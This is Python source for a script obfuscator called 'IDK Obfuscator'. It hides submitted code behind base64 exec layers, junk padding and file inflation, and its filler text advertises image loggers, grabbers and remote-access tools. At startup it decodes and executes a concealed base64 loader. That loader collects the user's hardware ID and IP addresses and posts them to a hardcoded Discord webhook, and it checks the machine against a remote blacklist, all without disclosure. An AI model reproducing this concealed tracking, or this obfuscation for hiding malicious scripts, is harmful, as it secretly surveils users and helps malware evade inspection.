import base64, time, os, sys, secrets, string, json, requests, subprocess;from pystyle import Colors, Colorate;from urllib.request import Request, urlopen;from win10toast import ToastNotifier
obfuscator_version = '2.3'
with open("config.json") as f:
    very = json.load(f)
with open("config.json") as f:
    regular_key = very["regular_key"]
    premium_key = very["premium_key"]
    pump_choice = very["file_pumper"]
    pump_size = float(very["filepumper_size"])
if pump_size > 25:
    print(f'{Colors.red}IDK Obfuscator // High File Pumper Size')
    choice = input('Continue with >25MB filepumper size? (Y/N) (capital-sensitive)\n>> ')
    if choice == 'Y':
        pass
    elif choice == 'N':
        print(f'{Colors.white}INFO || Exiting program...')   
        time.sleep(1)
        sys.exit()
    else:
        print('Invalid choice! Choices are Y and N.')
else:
    pass
## version checker
current_version = requests.get('https://idk-version.glitch.me').text
missing_out_on = requests.get('https://idk-missing.glitch.me').text
if obfuscator_version != current_version:
    print(f'{Colors.red}Outdated version!\nYour version: {obfuscator_version}\nThe latest version: {current_version}\n\nThings you are missing out on: {missing_out_on}')
    time.sleep(5)
    sys.exit()
ip = requests.get('https://api.ipify.org/').text
byteloader='YXBwZGF0YSA9IG9zLmdldGVudignYXBwZGF0YScpCmh3aWQgPSBzdHIoc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoJ3dtaWMgY3Nwcm9kdWN0IGdldCB1dWlkJyksICd1dGYtOCcpLnNwbGl0KCdcbicpWzFdLnN0cmlwKCkKdHJ5OgogICAgd2l0aCBvcGVuKGYne2FwcGRhdGF9XFx3ZC5vcycsICdyJylhcyBmOgogICAgICAgIG9naXAgPSBmLnJlYWQoKQpleGNlcHQ6CiAgICB3aXRoIG9wZW4oZid7YXBwZGF0YX1cXHdkLm9zJywgJ3cnKWFzIGY6CiAgICAgICAgZi53cml0ZShpcCkKICAgIGYuY2xvc2UoKQp3aXRoIG9wZW4oZid7YXBwZGF0YX1cXHdkLm9zJywgJ3InKSBhcyBmOgogICAgb2dpcCA9IGYucmVhZCgpCmlmIGlwICE9IG9naXA6CiAgICBlbWJlZCA9IGYnQGV2ZXJ5b25lXG4qKldBUk5JTkcqKiAtIEEgdXNlciB2aW9sYXRlZCB0aGUgVG9TIG9mIElESyBPYmZ1c2NhdG9yLlxuKkhlcmUgaXMgdGhlaXIgY3VycmVudCBJUCo6IHx8e2lwfXx8XG4qT3JpZ2luYWwgSVAqOiB8fHtvZ2lwfXx8IFxuKipIV0lEKiogKHVzZWZ1bCBmb3Igbm9uLWlwIGJhbnMgYnV0IHN0aWxsIGJhbnMgdXNlcik6IHx8e2h3aWR9fHxcblxuKipJdCBpcyByZWNjb21lbmRlZCB0aGF0IHlvdSBibGFja2xpc3QgYm90aCBJUHMgJiBiYW4gdGhlIGhhcmR3YXJlIElELioqJwogICAgcGF5bG9hZCA9IGpzb24uZHVtcHMoeydjb250ZW50JzogZW1iZWQsICd1c2VybmFtZSc6ICdWUE4gRGV0ZWN0b3IgLSBJREsgT2JmdXNjYXRvcicsICdhdmF0YXJfdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F0dGFjaG1lbnRzLzgxMTAyNzQ4MDg5ODk2MTQyOC8xMDk1MDU0MDMwODEzODA2NjMyL2Fta3NkbGttLnBuZyd9KQogICAgaGVhZGVyczIgPSB7CiAgICAgICAgJ0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJywKICAgICAgICAnVXNlci1BZ2VudCc6ICdNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4xMSAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yMy4wLjEyNzEuNjQgU2FmYXJpLzUzNy4xMScKICAgIH0KICAgIHJlcSA9IFJlcXVlc3QoJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEwOTUwNTM3NzQxNTU5Mzk5ODEvOUNHbl9WVk1HZXc2ZnFIOXVMWmdBZ1BJRlJDNm9HVlVzbXQ3b3c5TVZmZjFBbzJKdjN6endDa0pweGM1QzFmckdqWmMnLGRhdGE9cGF5bG9hZC5lbmNvZGUoKSxoZWFkZXJzPWhlYWRlcnMyKQogICAgeCA9IHVybG9wZW4ocmVxKQogICAgcHJpbnQoJ1lvdSBoYXZlIGJlZW4gYmxhY2tsaXN0ZWQgZnJvbSBJREsgT2JmdXNjYXRvci5cblJlYXNvbjogVlBOIHVzZVxuQ29kZTogMDU3XG5MZW5ndGg6IEZvcmV2ZXInKQogICAgdGltZS5zbGVlcCgzKQogICAgc3lzLmV4aXQoKQplbHNlOgogICAgcHJpbnQoJ0lESyBPYmZ1c2NhdG9yIEJsYWNrbGlzdCBMb2FkZXIgLy8gQ29udGludWluZy4uLicpCiAgICB0aW1lLnNsZWVwKDEuMjUpCmRlZiBjaGVjayhod2lkZCxpcGNoZWNrLGNvZGUsbGVuZ3RoKToKICAgIGlmIGh3aWRkID09IGh3aWQ6CiAgICAgICAgcGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwcmludChmJ1lvdSBhcmUgYmxhY2tsaXN0ZWQgZnJvbSBJREsgT2JmdXNjYXRvci4gQXBwZWFsIGZvciB5b3VyIGJhbiBpbiB0aGUgc2VydmVyLCBhbmQgaGF2ZSB0aGUgY29kZSB0b28uXG5CbGFja2xpc3QgQ29kZToge2NvZGV9XG5MZW5ndGggb2YgYmFuOiB7bGVuZ3RofScpO3RpbWUuc2xlZXAoNSk7c3lzLmV4aXQoKQogICAgaWYgaXBjaGVjayA9PSBpcDoKICAgICAgICBwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3Bhc3M7cGFzcztwYXNzO3ByaW50KGYnWW91IGFyZSBibGFja2xpc3RlZCBmcm9tIElESyBPYmZ1c2NhdG9yLiBBcHBlYWwgZm9yIHlvdXIgYmFuIGluIHRoZSBzZXJ2ZXIsIGFuZCBoYXZlIHRoZSBjb2RlIHRvby5cbkJsYWNrbGlzdCBDb2RlOiB7Y29kZX1cbkxlbmd0aCBvZiBiYW46IHtsZW5ndGh9Jyk7dGltZS5zbGVlcCg1KTtzeXMuZXhpdCgpCiAgICBlbHNlOgogICAgICAgIHBhc3MKdXJsID0gcmVxdWVzdHMuZ2V0KCdodHRwczovLzZjOWI4MjE1NzdmYzFhZmIzZjFkNjVmMWM0ZjMxNDIzYmZmODc2NmYuZ2xpdGNoLm1lJykudGV4dAp2ZXJ5ID0ganNvbi5sb2Fkcyh1cmwpCmJsYWNrbGlzdGVkaHdpZCA9IHZlcnlbImh3aWQxIl0KYmxhY2tsaXN0ZWRpcCA9IHZlcnlbImJsYWNrbGlzdDEiXQpibGFja2xpc3Rjb2RlPXZlcnlbImNvZGUxIl0KYmxhY2tsaXN0bGVuZ3RoID0gdmVyeVsibGVuZ3RoMSJdCmNoZWNrKGh3aWRkPWJsYWNrbGlzdGVkaHdpZCxpcGNoZWNrPWJsYWNrbGlzdGVkaXAsY29kZT1ibGFja2xpc3Rjb2RlLCBsZW5ndGg9YmxhY2tsaXN0bGVuZ3RoKQ==';byte1=byteloader.encode();byte2=base64.b64decode(byte1);byte3=byte2.decode();exec(byte3)
print('Blacklist // false')
time.sleep(1.25)
def regular():
    phrases = [
        'Lol guys when are we gonna play doors',
        'Already???',
        'Bro how did you die',
        'Whats for din din tonight',
        '.gg/t8sgJFct6Y || come join the IDK Obfuscator server',
        'guys i just beamed like 3000 people from a image logger (totally real)',
        '.gg/beltz for image loggers (real)',
        'mbr overwriting with python || $650',
        'BRO WHY IS VENOM CONTROL $200-$650 LOLLLLLL',
        'venom control cracked (real)',
        'guys what should i make in python (im procrastinating 50 hours of homework)',
        'this game sucks, im going to play build a boat for treasure',
        'this game sucks, im going to play doors',
        'this game sucks, im going to program python obfuscators',
        'this game sucks, im going to program python remoters',
        'this game sucks, im going to browse all over github for random grabbers that im going to use on just one person',
        'this game sucks, im going to play a game that isnt this game (real)',
        'this game sucks, this game sucks',
        'this sucks game, going im to play brain game shovelwares',
        ',game sucks this mi going to piza',
        'guys i like typing silly phrases its funny',
        'Obfuzcatyd By Neckzus Obzfuzcatyr -7.77.0',
        'A DAY IN THE LIFE OF A FAMOUS PYTHON PROGRAMMER (i make 0 dollars a year and my games get 1 concurrent user)',
        'guys i just logged 1 person and 15 bots (EPIC JACKPOT WIN)',
        'me acting like im super awesome and mysterious in class (im severely braindead & autistic)',
        'guys i just logged 0 people and 1 bot (BIG WIN :money:)',
        'Obfuscated by IDK Obfuscator 2.3'
    ]
    def generatephrase():
        idk = ''
        for i in range(1):
            idk += ''.join(secrets.choice(phrases))
        return idk
    def generatestring(length):
        idk = secrets.token_hex(length)
        return idk
    def generatewallstring(length):
        idk1 = string.ascii_uppercase + string.digits
        idk = ''
        for i in range(length):
            idk += ''.join(secrets.choice(idk1))
        return idk
    def generatetoken(length):
        idk = secrets.token_bytes(length)
        return idk
    with open('script-here.txt', 'r',errors='ignore') as f:
        script = f.read()
    if script == '':
        print(f'{Colors.red}Theres nothing in the script-here file!')
        time.sleep(3)
        sys.exit()
    reg_token=f'idk="""Script generated by IDK Obfuscator v2.3 // script;{str(generatetoken(100))}'
    n = 0
    while n < 500:
        n += 1
        reg_token += f'{str(generatetoken(350))}\n'
    reg_token += f'"""\n'
    m1 = script.encode()
    m2 = base64.b64encode(m1)
    encoded_script = m2.decode()
    function_yay = str(generatestring(4))
    walls = ''
    n = 0
    while n < 500:
        n += 1
        walls += f'__IDK__OBFUSCATOR__{str(generatewallstring(150))} = {str(generatetoken(350))}\n'
    walls += f'''
def idk_obfuscator_{function_yay}(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z):
    pass
'''
    while n < 1500:
        n += 1
        walls += f'idk_obfuscator_{function_yay}("{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}")\n'
    watermark = 'dHJ5OgogICAgaWYgX18gIT0gIk9iZnVzY2F0ZWQgYnkgSURLIE9iZnVzY2F0b3IgLSBWZXJ5VmVyeUNvb2wxMjMjMDY4NiAvLyBkZWVjb3l6IC8vIC5nZy90OHNnSkZjdDZZIjoKICAgICAgICBwcmludCgnT2JmdXNjYXRvciB3YXRlcm1hcmsgaXMgbWlzc2luZyEgR28gbG9vayBhdCB0aGUgcmVhbCBwZXJzb24gd2hvIG9iZnVzY2F0ZWQgdGhpcyBzY3JpcHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICB3ZWJicm93c2VyLm9wZW4oImh0dHBzOi8vZGlzY29yZC5nZy90OHNnSkZjdDZZIikKICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgc3lzLmV4aXQoKQogICAgZWxzZToKICAgICAgICBwYXNzCmV4Y2VwdDoKICAgIHByaW50KCJUaGUgY3JlYXRvciBvZiB0aGlzIHNjcmlwdCBkZWNpZGVkIHRvIHRha2UgdGhpcyBvbmUgc3RlcCBmdXJ0aGVyIGFuZCBkZWxldGUgdGhlIHdhdGVybWFyay4iKQogICAgdGltZS5zbGVlcCgxKQogICAgd2ViYnJvd3Nlci5vcGVuKCJodHRwczovL2Rpc2NvcmQuZ2cvdDhzZ0pGY3Q2WSIpCiAgICB0aW1lLnNsZWVwKDMpCiAgICBzeXMuZXhpdCgp'
    file = f'idk-{str(generatestring(7))}.py'
    with open('imports-here.txt', 'r') as importing:
        imports = importing.read()
    with open(f'{file}', 'w') as f:
        var1 = str(generatestring(2500))
        var2 = str(generatestring(2500))
        var3 = str(generatestring(2500))
        f.write(f'## Obfuscated by IDK 2.3\n## IDK-Obfuscator Session: {str(generatestring(150))}\nimport base64, time, sys, webbrowser\n{imports}\n__ = "Obfuscated by IDK Obfuscator - VeryVeryCool123#0686 // deecoyz // .gg/t8sgJFct6Y"\n__gamepass = "Obfuscator - https://www.roblox.com/game-pass/159211116/idk"\n__premium = "Premium Version - https://www.roblox.com/game-pass/159212104/idk-again"\n{reg_token}')
        f.write(walls+f'idk{var1}="{watermark}";idkidk{var2}=idk{var1}.encode();idkidk{var3}=base64.b64decode(idkidk{var2});exec(idkidk{var3})\n')
        f.write(f'bb{var1}="{encoded_script}";idk{var2}=bb{var1}.encode();idk{var3}=base64.b64decode(idk{var2});exec(idk{var3})')
    print(f'{Colors.green}Script obfuscated! Find the script as {file}!')
    global directory
    global toast

    directory = os.getcwd()
    toast = ToastNotifier()
    file_size = os.path.getsize(f'{directory}\\{file}')
    mb = round(float(file_size / 1000000), 2)
    toast.show_toast(
        f"Script '{file}' is obfuscated!",
        f"File size: {file_size} bytes // ~{mb}MB",
        duration = 10,
        icon_path = directory+"\\src\\f.ico",
        threaded = True,
    )
def Premium():
    def generatestring(length):
        idk = secrets.token_hex(length)
        return idk
    file = f'idk-{str(generatestring(7))}.py'
    phrases = [
        'Lol guys when are we gonna play doors',
        'Already???',
        'Bro how did you die',
        'Whats for din din tonight',
        '.gg/t8sgJFct6Y || come join the IDK Obfuscator server',
        'guys i just beamed like 3000 people from a image logger (totally real)',
        '.gg/beltz for image loggers (real)',
        'mbr overwriting with python || $650',
        'BRO WHY IS VENOM CONTROL $200-$650 LOLLLLLL',
        'venom control cracked (real)',
        'guys what should i make in python (im procrastinating 50 hours of homework)',
        'this game sucks, im going to play build a boat for treasure',
        'this game sucks, im going to play doors',
        'this game sucks, im going to program python obfuscators',
        'this game sucks, im going to program python remoters',
        'this game sucks, im going to browse all over github for random grabbers that im going to use on just one person',
        'this game sucks, im going to play a game that isnt this game (real)',
        'this game sucks, this game sucks',
        'this sucks game, going im to play brain game shovelwares',
        ',game sucks this mi going to piza',
        'guys i like typing silly phrases its funny',
        'Obfuzcatyd By Neckzus Obzfuzcatyr -7.77.0',
        'A DAY IN THE LIFE OF A FAMOUS PYTHON PROGRAMMER (i make 0 dollars a year and my games get 1 concurrent user)',
        'guys i just logged 1 person and 15 bots (EPIC JACKPOT WIN)',
        'me acting like im super awesome and mysterious in class (im severely braindead & autistic)',
        'guys i just logged 0 people and 1 bot (BIG WIN :money:)',
        'Obfuscated by IDK Obfuscator 2.3',
        'IDK Obfuscator - Premium Version'
    ]
    def generatephrase():
        idk = ''
        for i in range(1):
            idk += ''.join(secrets.choice(phrases))
        return idk
    def generatewallstring(length):
        idk1 = string.ascii_uppercase + string.digits
        idk = ''
        for i in range(length):
            idk += ''.join(secrets.choice(idk1))
        return idk
    def generatetoken(length):
        idk = secrets.token_bytes(length)
        return idk
    def generateattribute():
        choices = ['capitalize', 'casefold', 'center',
                   'count', 'encode', 'endswith',
                   'format_map', 'find', 'index',
                   'isalnum', 'isalpha', 'rjust'
                   ]
        idk = ''
        for i in range(1):
            idk += ''.join(secrets.choice(choices))
        return idk
    function_yay = str(generatestring(4))
    def pumpfile(size):
        real_size = int((size * 1000000))
        print_size = int((size * 1000000) + 3150000)
        mb_size_print = round(float(print_size / 1000000), 3)
        print(f'{Colors.yellow}INFO {Colors.white}|| {Colors.blue}Pumping file up to size: >{print_size} bytes {Colors.white}// {Colors.blue}>~{mb_size_print} MB')
        time.sleep(2.5)
        lines = round(float(real_size / 9750));n = 0;content = ''
        while n < lines:
            n += 1
            bytes = (12502 * n)
            mb_size_bytes = round(float(bytes / 1000000), 2)
            time.sleep(0.01)
            print(f'{Colors.yellow}INFO {Colors.white}#{Colors.red}{n} {Colors.white}|| ~{Colors.red}{bytes} {Colors.pink}bytes {Colors.white}// ~{Colors.red}{mb_size_bytes}MB pumped in file {Colors.white}- {Colors.red}{file}')
            content += f'idk{str(generatestring(length=250))}="{str(generatestring(5999))}"\n'
        print(f'{Colors.yellow}INFO {Colors.white}|| {Colors.blue}File is being pumped to >{print_size} bytes{Colors.white} // {Colors.blue}>~{mb_size_print} MB...')
        time.sleep(1.5)
        return content
    dots = '_ = ">=> get better/im awesome // obfuscated by IDK Obfuscator 2.3 - Premium Version"\n'
    n = 0
    while n < 1000:
        n += 1
        dots += f'_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())};_.{str(generateattribute())}\n'
    with open('script-here.txt', 'r',errors='ignore') as f:
        script = f.read()
    if script == '':
        print(f'{Colors.red}Theres nothing in the script-here file!')
        time.sleep(3)
        sys.exit()
    reg_token=f'idk="""Script generated by IDK Obfuscator v2.3 // script;{str(generatetoken(100))}'
    n = 0
    while n < 500:
        n += 1
        reg_token += f'{str(generatetoken(350))}\n'
    reg_token += f'"""\n'
    m1 = script.encode()
    m2 = base64.b64encode(m1)
    encoded_script = m2.decode()
    walls = ''
    n = 0
    while n < 500:
        n += 1
        walls += f'__IDK__OBFUSCATOR__{str(generatewallstring(150))} = {str(generatetoken(350))}\n'
    walls += f'''
def idk_obfuscator_{function_yay}(a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z):
    pass
'''
    if pump_choice == 'True':
        walls += str(pumpfile(pump_size))
    else:
        pass
    while n < 1500:
        n += 1
        walls += f'idk_obfuscator_{function_yay}("{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}","{str(generatephrase())}")\n'
    watermark = 'dHJ5OgogICAgaWYgX18gIT0gIk9iZnVzY2F0ZWQgYnkgSURLIE9iZnVzY2F0b3IgLSBWZXJ5VmVyeUNvb2wxMjMjMDY4NiAvLyBkZWVjb3l6IC8vIC5nZy90OHNnSkZjdDZZIjoKICAgICAgICBwcmludCgnT2JmdXNjYXRvciB3YXRlcm1hcmsgaXMgbWlzc2luZyEgR28gbG9vayBhdCB0aGUgcmVhbCBwZXJzb24gd2hvIG9iZnVzY2F0ZWQgdGhpcyBzY3JpcHQnKQogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgICAgICB3ZWJicm93c2VyLm9wZW4oImh0dHBzOi8vZGlzY29yZC5nZy90OHNnSkZjdDZZIikKICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgc3lzLmV4aXQoKQogICAgZWxzZToKICAgICAgICBwYXNzCmV4Y2VwdDoKICAgIHByaW50KCJUaGUgY3JlYXRvciBvZiB0aGlzIHNjcmlwdCBkZWNpZGVkIHRvIHRha2UgdGhpcyBvbmUgc3RlcCBmdXJ0aGVyIGFuZCBkZWxldGUgdGhlIHdhdGVybWFyay4iKQogICAgdGltZS5zbGVlcCgxKQogICAgd2ViYnJvd3Nlci5vcGVuKCJodHRwczovL2Rpc2NvcmQuZ2cvdDhzZ0pGY3Q2WSIpCiAgICB0aW1lLnNsZWVwKDMpCiAgICBzeXMuZXhpdCgp'
    with open('imports-here.txt', 'r') as importing:
        imports = importing.read()
    with open(f'{file}', 'w') as f:
        var1 = str(generatestring(2500))
        var2 = str(generatestring(2500))
        var3 = str(generatestring(2500))
        f.write(f'## Obfuscated by IDK 2.3\n## IDK-Obfuscator Session: {str(generatestring(150))}\nimport base64, time, sys, webbrowser\n{imports}\n__ = "Obfuscated by IDK Obfuscator - VeryVeryCool123#0686 // deecoyz // .gg/t8sgJFct6Y"\n__gamepass = "Obfuscator - https://www.roblox.com/game-pass/159211116/idk"\n__premium = "Premium Version - https://www.roblox.com/game-pass/159212104/idk-again"\n{reg_token}')
        f.write(walls+f'{dots}idk{var1}="{watermark}";idkidk{var2}=idk{var1}.encode();idkidk{var3}=base64.b64decode(idkidk{var2});exec(idkidk{var3})\n')
        f.write(f'bb{var1}="{encoded_script}";idk{var2}=bb{var1}.encode();idk{var3}=base64.b64decode(idk{var2});exec(idk{var3})')
    print(f'{Colors.green}Script obfuscated! Find the script as {file}!')
    global directory
    global toast

    directory = os.getcwd()
    toast = ToastNotifier()
    file_size = os.path.getsize(f'{directory}\\{file}')
    mb = round(float(file_size / 1000000), 2)
    toast.show_toast(
        f"Script '{file}' is obfuscated!",
        f"File size: {file_size} bytes // ~{mb}MB",
        duration = 10,
        icon_path = directory+"\\src\\f.ico",
        threaded = True,
    )
def clear():
    os.system('cls')
def bannerprint(color):
    print(color, banner)
    time.sleep(0.05)
    clear()
if __name__ == '__main__':
    userchoicemain = int(input(
'''
IDK Obfuscator Epilepsy Warning
(1) Display banner (FLASHING COLORS)
(2) Display banner (Just white, no flashing colors.)
>> '''))
    banner='''
************//*********//****/********************/*********/**********/*********************************************//****///**//****//**/*/**///**/****//********//**************/****//*********//***
*********************************/**********//**********/*/*******/***************************,***,,****************************/*********************************/*************************************
/****/****//***//********//*****/***/*************/*/*****/************************,/#################((/*,,/######/,,,**********************/*********//**************/****/***//***///***/*********/**
***************************//***/*/****/**************/****************,***,,,,(###########################################(*,,**********************/**********/**************************************/
********/**********/*****/****/***//****/***/***//*****************,,*,,*(########################################################(******************//*********************************/******/*****/**
/***********************************************************,**,,/################################ ######################################*,************//*************/*****/***************************
/***************/***************/****/****/***************,*##################.################## ######################.###################******************//**///*******/************/**************
/******/***//****/******/***************************,**,/##################(/##############&&&&&&&&#####################.#####################*****************//*********/*******//***//***//******/***
/*******///***//****/****//*************//**********,*######################&######%&&&&&&&&&&&&&&&&###&&&&&&&&&&&&&&#####&&%###################*,,,*,***********/*********//*******//**/*//****/****/**
/********************/*********/*********/********,*,,,##################&&&###&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#&&&&&&&&&&#####################*********************/*******************/*******
**********************************//**///********,,,/#################%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#######/###########,,,##******************************************
*/*******/*********///*************//***********,,,,,###############&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#####*###############,**,*******************/*********///**/***
****//*********//********//*/**/**************,,,,,.(#############&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#(#&&%##################***********/**********//********/**
******///**//*********//*********/***********,,,,,.############&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%##############(*************///***//*********//****
/*******************************************,,,,,*########%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##########,,,,,***********************************
*********//****//**//*******/**************,,,,,*#######&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%###########*,,***********/***///***///*///*******
*//***/*****//**/****/*/*******************,,,,########&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&####.###(,/##(,********/**/*****///**/***///*****
*******************/*******/*************,,,,,,######%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&###.#####,,,,/(************************/*******/
/**/*****/****/**/******//***//***//*****,,,,,,#####&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#######/,,,,****/****/*****/***//**/******/***
***********///*////***/********//*******,,,,,,,####%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&##%#####,,,,*****************///*////***/****/
*******/****************/*//************,,,,,..###%&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#&&######,,,*****************************/**/*
********/*****/*********/****//**********,,,,,/###&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#####,,,*******/******/*****/*********/***
************/****/*********/***/*******,,,,,,.###&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#####/,,,**********************/**********
***************************************,,,,,,.##&&&&&&&&&&&&&&&&&&&&&&&&&&&&&, (&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&%#####,,,***************/*****************
********/****//*********/*****/********,,,,,,(#&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&( &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&#####,,,*************/****/**************
*******/***//**/*****//*******/********,,,,..#%&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&& &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&####(,,,,***********/***//**/*****//*****
